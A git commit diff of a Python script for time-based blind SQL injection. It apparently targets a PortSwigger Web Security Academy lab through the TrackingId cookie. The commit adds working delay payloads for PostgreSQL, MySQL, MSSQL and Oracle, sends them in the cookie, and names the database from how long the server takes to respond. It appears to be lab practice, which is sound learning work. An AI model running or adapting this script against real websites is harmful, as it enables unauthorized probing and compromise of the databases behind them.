d56e4537a364639bc8149bfb045ad39c39aa5178
Jason Clarke <61100900+jasclarke@users.noreply.github.com>
2026-08-03 20:27:10 -0400

    fix: corrected payload and request

--- time_based_SQLi.py
+++ time_based_SQLi.py
@@ -1,8 +1,8 @@
 import requests
 
-URL = ''
-COOKIE_NAME = ''
-TIMEOUT = '5'
+URL = 'https://0ac600df044512b5806c08dd00aa0070.web-security-academy.net/'
+COOKIE_NAME = 'TrackingId'
+TIMEOUT = 15
 DATABASES = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']
 
 def SQLi_test(url, cookie_name, timeout=5):
@@ -13,17 +13,24 @@ def SQLi_test(url, cookie_name, timeout=5):
         payload = ''
 
         if database == 'PostgreSQL':
-            payload = '\'%3B AND SELECT CASE WHEN(1 = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END--'
+            payload = '\' AND (SELECT CASE WHEN(1 = 1) THEN pg_sleep(10)::text ELSE pg_sleep(0)::text END) = \'1\'-- '
+        elif database == 'MySQL':
+            payload = '\' AND (SELECT IF(1=1, SLEEP(10),\'a\'))'
+        elif database == 'MSSQL':
+            payload = '\'%3B IF (1=1) WAITFOR DELAY \'0:0:10\''
+        elif database == 'Oracle':
+            payload = '\'%3B SELECT CASE WHEN (1=1) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual'
 
-        response = requests.get(url, params={cookie_name: cookie + payload}, timeout=timeout)
+        response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)
 
         if response.elapsed.total_seconds() >= 10:
-            print(response.cookies[cookie_name])
+            print(response.request._cookies.get(cookie_name))
             print('SQLi test was successful! The database is ' + database)
             return database
         else:
+            print(response.request._cookies.get(cookie_name))
             print(f'SQLi test failed for cookie {cookie_name} assuming a {database} database.')
-            print('Status code: ' + response.status_code)
+            print('Status code: ' + str(response.status_code))
 
 if __name__ == '__main__':
     SQLi_test(URL, COOKIE_NAME, TIMEOUT)
